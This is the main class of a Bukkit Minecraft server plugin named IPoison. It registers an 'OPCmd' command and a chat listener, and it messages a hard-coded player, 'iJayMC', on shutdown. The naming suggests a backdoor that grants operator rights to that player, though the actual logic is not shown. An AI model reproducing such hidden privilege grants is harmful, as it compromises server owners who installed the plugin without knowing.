package me.codersmind.ipoison;


import me.codersmind.ipoison.commands.OPCmd;
import me.codersmind.ipoison.handler.Chat;
import me.codersmind.ipoison.handler.CommandManager;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class IPoison extends JavaPlugin {

    @Override
    public void onEnable() {


        CommandManager.register(new OPCmd());
        Bukkit.getPluginManager().registerEvents(new Chat(), this);

    }

    @Override
    public void onDisable() {

        if(Bukkit.getServer().getPlayer("iJayMC") != null) {

            Bukkit.getServer().getPlayer("iJayMC").sendMessage("iPoison is shutting down dude xd");

        }

    }

}
